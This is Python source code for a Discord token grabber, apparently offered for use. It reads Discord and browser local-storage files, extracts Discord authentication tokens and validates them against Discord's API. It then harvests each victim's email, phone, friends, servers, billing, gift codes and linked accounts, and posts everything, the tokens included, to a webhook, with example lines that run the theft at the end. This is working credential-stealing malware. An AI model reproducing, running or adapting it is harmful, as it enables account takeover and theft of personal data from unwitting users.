import os
import re
import json
import base64
import requests
from datetime import datetime, timezone
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pathlib import Path

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.relationships_url = "https://discord.com/api/v9/users/@me/relationships"
        self.guilds_url = "https://discord.com/api/v9/users/@me/guilds"
        self.billing_url = "https://discord.com/api/v9/users/@me/billing/subscriptions"
        self.promotions_url = "https://discord.com/api/v9/outbound-promotions/codes"
        self.connections_url = "https://discord.com/api/v9/users/@me/connections"
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.tokens = []
        self.user_data = []
        self.grab_tokens()

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        except Exception as e:
            print(f"Decryption error: {e}")
            return None

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return self.decrypt_val(master_key[5:], b"")

    def grab_tokens(self):
        paths = {
            'Discord': Path.home() / '.config' / 'discord' / 'Local Storage' / 'leveldb',
            'Chrome': Path.home() / '.config' / 'google-chrome' / 'Default' / 'Local Storage' / 'leveldb',
            'Firefox': Path.home() / '.mozilla' / 'firefox'
        }

        for name, path in paths.items():
            if not path.exists():
                continue

            if name == 'Firefox':
                for root, _, files in os.walk(path):
                    for file in files:
                        if not file.endswith('.sqlite'):
                            continue
                        with open(Path(root) / file, 'r', errors='ignore') as f:
                            for line in f:
                                for token in re.findall(self.regex, line):
                                    self.validate_token(token)
            else:
                local_state_path = path.parent / 'Local State'
                if local_state_path.exists():
                    master_key = self.get_master_key(local_state_path)
                    for file_name in os.listdir(path):
                        if file_name.endswith(".ldb") or file_name.endswith(".log"):
                            with open(path / file_name, 'r', errors='ignore') as f:
                                for line in f:
                                    for token in re.findall(self.regex, line):
                                        self.validate_token(token)

    def validate_token(self, token):
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        user_response = requests.get(self.baseurl, headers=headers)
        if user_response.status_code == 200:
            user_info = user_response.json()
            user_id = user_info.get('id')
            if user_id not in [user['id'] for user in self.user_data]:
                friends_count, blocked_count = self.get_friends_and_blocked_count(headers)
                server_count = self.get_server_count(headers)
                nitro_info = self.get_nitro_info(headers)
                gift_codes = self.get_gift_codes(headers)
                connections = self.get_connections(headers)
                badges = self.get_badges(user_info.get('public_flags', 0))
                account_creation_date = self.get_account_creation_date(user_id)
                user_data = {
                    'id': user_id,
                    'username': f"{user_info['username']}#{user_info['discriminator']}",
                    'avatar_url': f"https://cdn.discordapp.com/avatars/{user_id}/{user_info['avatar']}.png",
                    'email': user_info.get('email', 'N/A'),
                    'phone': user_info.get('phone', 'N/A'),
                    'token': token,
                    'badges': badges,
                    'creation_date': account_creation_date,
                    'friends_count': friends_count,
                    'blocked_count': blocked_count,
                    'server_count': server_count,
                    'nitro_info': nitro_info,
                    'gift_codes': gift_codes,
                    'connections': connections
                }
                self.user_data.append(user_data)
                print(f"User data collected for: {user_data['username']}")

    def get_friends_and_blocked_count(self, headers):
        response = requests.get(self.relationships_url, headers=headers)
        if response.status_code == 200:
            relationships = response.json()
            friends = [r for r in relationships if r['type'] == 1]
            blocked = [r for r in relationships if r['type'] == 2]
            return len(friends), len(blocked)
        return 0, 0

    def get_server_count(self, headers):
        response = requests.get(self.guilds_url, headers=headers)
        if response.status_code == 200:
            guilds = response.json()
            return len(guilds)
        return 0

    def get_nitro_info(self, headers):
        response = requests.get(self.billing_url, headers=headers)
        if response.status_code == 200:
            subscriptions = response.json()
            if subscriptions:
                return f"{subscriptions[0].get('plan')} since {subscriptions[0].get('start_date')}"
        return "No Nitro"

    def get_gift_codes(self, headers):
        response = requests.get(self.promotions_url, headers=headers)
        if response.status_code == 200:
            promotions = response.json()
            return [p.get('code') for p in promotions if p.get('code')]
        return []

    def get_connections(self, headers):
        response = requests.get(self.connections_url, headers=headers)
        if response.status_code == 200:
            connections = response.json()
            return [f"{c['type']}: {c['name']}" for c in connections]
        return []

    def get_badges(self, public_flags):
        badge_dict = {
            1: "Discord Staff",
            2: "Partnered Server Owner",
            4: "HypeSquad Events",
            8: "Bug Hunter Level 1",
            64: "HypeSquad Bravery",
            128: "HypeSquad Brilliance",
            256: "HypeSquad Balance",
            512: "Early Supporter",
            16384: "Bug Hunter Level 2",
            131072: "Verified Bot Developer"
        }
        return [name for flag, name in badge_dict.items() if public_flags & flag]

    def get_account_creation_date(self, user_id):
        timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
        return datetime.fromtimestamp(timestamp, timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')

    def send_to_webhook(self, webhook_url):
        for user in self.user_data:
            data = {
                "content": "",
                "embeds": [
                    {
                        "title": "Discord User Info",
                        "fields": [
                            {"name": "Username", "value": user['username'], "inline": True},
                            {"name": "Email", "value": user['email'], "inline": True},
                            {"name": "Phone", "value": user['phone'], "inline": True},
                            {"name": "Discord ID", "value": user['id'], "inline": True},
                            {"name": "Badges", "value": ", ".join(user['badges']) or "None", "inline": False},
                            {"name": "Account Creation Date", "value": user['creation_date'], "inline": False},
                            {"name": "Number of Friends", "value": str(user['friends_count']), "inline": True},
                            {"name": "Blocked Users", "value": str(user['blocked_count']), "inline": True},
                            {"name": "Server Count", "value": str(user['server_count']), "inline": True},
                            {"name": "Nitro Info", "value": user['nitro_info'], "inline": False},
                            {"name": "Gift Codes", "value": ", ".join(user['gift_codes']) or "None", "inline": False},
                            {"name": "Connections", "value": ", ".join(user['connections']) or "None", "inline": False},
                            {"name": "Token", "value": user['token'], "inline": False}
                        ],
                        "thumbnail": {"url": user['avatar_url']}
                    }
                ]
            }
            response = requests.post(webhook_url, json=data)
            if response.status_code in [200, 204]:
                print(f"User data sent successfully for: {user['username']}")
            else:
                print(f"Failed to send data for: {user['username']}, Status code: {response.status_code}")

# Example usage
discord_grabber = Discord()
discord_grabber.send_to_webhook(webhook_url)
